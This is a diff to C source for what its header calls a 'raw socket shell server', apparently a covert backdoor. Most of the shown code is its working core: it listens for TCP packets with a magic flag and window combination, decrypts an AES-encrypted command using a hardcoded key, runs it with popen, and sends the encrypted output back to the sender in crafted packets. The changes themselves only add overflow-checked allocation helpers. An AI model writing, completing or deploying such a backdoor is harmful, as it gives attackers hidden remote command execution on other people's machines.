@@ -46,15 +46,25 @@ just another raw socket shell server
 #include <openssl/evp.h>
  unsigned char key[]="magic1337";
  unsigned char iv[16]="1234567890123456";
- unsigned char aad[16]="abcdefghijklmnop"; //dummy
- int k;
+ unsigned char aad[16]="abcdefghijklmnop"; 
+ int k=0;
+#include <assert.h>
+#include <limits.h>
+#include <stdint.h>
+#include <stddef.h>
+
+#define XFREE(x) xfree((void **)x);
+#define MUL_NO_OVERFLOW	((size_t)1 << (sizeof(size_t)*4))
+void *xmallocarray (size_t nmemb, size_t size);
+void xfree(void **ptr);
+
+
 char *encode64 (const void *b64_encode_this, int encode_this_many_bytes);
 char *decode64 (const void *b64_decode_this, int decode_this_many_bytes);
 void fazerpacote(char * dest_addr, unsigned short dest_port,char *payload); 
 unsigned short in_cksum(unsigned short *, int);   
 int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *aad, int aad_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext, unsigned char *tag);
 int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *aad, int aad_len, unsigned char *tag, unsigned char *key, unsigned char *iv, unsigned char *plaintext);
-void chomp(char * str);
 
 void handleErrors()
 {
@@ -82,21 +92,17 @@ int main(void)
  	{
   		if((ntohs(tcphr->dest)==PORT)&&(tcphr->fin == 1)&&(tcphr->psh == 1) && (tcphr->urg == 1) && (tcphr->window == htons(10666))) 
   		{
-
-    
-            unsigned char plaintext[1024],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[100],pt[1024+EVP_MAX_BLOCK_LENGTH];
-
-    				counter=sizeof(struct tcphdr) + sizeof(struct iphdr);
-
-    				inet_ntop(AF_INET,&(iphr->saddr),ip_tmp,INET_ADDRSTRLEN);
-            unsigned char *decode_64_input=decode64(buffer+counter,strlen(buffer+counter));
-            memset(pt,0,1024);
-            k = decrypt(decode_64_input, strlen(decode_64_input), aad, sizeof(aad), tag, key, iv, pt);
-            char *decode_64_output=decode64(pt,strlen(pt));
-            int sizedecode=strlen(decode_64_output);
-    				char *cmd2=malloc(sizedecode+1*sizeof(char));
-            memset(cmd2,0,sizedecode);
-    				snprintf(cmd2,sizedecode+1*sizeof(char),"%s",decode_64_output);
+            		unsigned char plaintext[1024],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[100],pt[1024+EVP_MAX_BLOCK_LENGTH];
+    			counter=sizeof(struct tcphdr) + sizeof(struct iphdr);
+    			inet_ntop(AF_INET,&(iphr->saddr),ip_tmp,INET_ADDRSTRLEN);
+            		unsigned char *decode_64_input=decode64(buffer+counter,strlen(buffer+counter));
+            		memset(pt,0,1024);
+            		k = decrypt(decode_64_input, strlen(decode_64_input), aad, sizeof(aad), tag, key, iv, pt);
+            		char *decode_64_output=decode64(pt,strlen(pt));
+            		int sizedecode=strlen(decode_64_output);
+    			char *cmd2=xmallocarray(sizedecode+1,sizeof(char));
+            		memset(cmd2,0,sizedecode);
+    			snprintf(cmd2,sizedecode+1*sizeof(char),"%s",decode_64_output);
 
 
     				if ( !(fpipe = (FILE *)popen (cmd2,"r")) ) 
@@ -107,21 +113,20 @@ int main(void)
 
     				while (fgets (line, sizeof line, fpipe)) 
     				{
-              unsigned char plaintext2[1024],ciphertext2[1024+EVP_MAX_BLOCK_LENGTH],tag2[100],pt2[1024+EVP_MAX_BLOCK_LENGTH];
+              				unsigned char plaintext2[1024],ciphertext2[1024+EVP_MAX_BLOCK_LENGTH],tag2[100],pt2[1024+EVP_MAX_BLOCK_LENGTH];
        //       printf("debug show result cmd %s\n",line);
-              unsigned char *encode_64_input2=encode64(line,strlen((char *)line));
-              k = encrypt(encode_64_input2, strlen(encode_64_input2), aad, sizeof(aad), key, iv, ciphertext2, tag2);
-              char *encode_64_output2=encode64(ciphertext2,strlen((char *)ciphertext2));
+              				unsigned char *encode_64_input2=encode64(line,strlen((char *)line));
+              				k = encrypt(encode_64_input2, strlen(encode_64_input2), aad, sizeof(aad), key, iv, ciphertext2, tag2);
+              				char *encode_64_output2=encode64(ciphertext2,strlen((char *)ciphertext2));
      					fazerpacote(ip_tmp,PORT,encode_64_output2);
      					bzero(line,MAX);
      					free(encode_64_input2);
               free(encode_64_output2);
     				}
 
-    				pclose(fpipe);
-    	       
-    				free(decode_64_input);
-    				free(cmd2);
+    			pclose(fpipe);
+    			free(decode_64_input);
+    			free(cmd2);
     				
 
   		}
@@ -133,6 +138,37 @@ int main(void)
 }
 
 
+// based in OpenBSD reallocarray() function http://man.openbsd.org/reallocarray.3
+void *xmallocarray (size_t nmemb, size_t size) 
+{
+	if ((nmemb >= MUL_NO_OVERFLOW || size >= MUL_NO_OVERFLOW) && nmemb > 0 && SIZE_MAX / nmemb < size) 
+	{
+		puts("integer overflow block");
+		return NULL;
+	}
+
+	void *ptr = malloc (nmemb*size);
+
+	if (ptr == NULL)
+	{
+ 
+		puts("error in xmallocarray() function");
+		exit(1);
+	}
+
+	return ptr;
+}
+
+void xfree(void **ptr) 
+{
+	assert(ptr);
+	if( ptr != NULL )
+        {
+		free(*ptr);
+		*ptr=NULL;	
+        }
+	
+}
 
      
 void fazerpacote(char *dest_addr, unsigned short dest_port, char * payload)
@@ -452,16 +488,3 @@ int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *aad,
   }
 }
 
-
-void chomp(char * str)
-{
-  	while(*str) 
-  	{
-    		if(*str == '\n' || *str == '\r') 
-    		{
-     			*str = 0;
-     			return;
-    		}
-    		str++;
-  	}
-} 
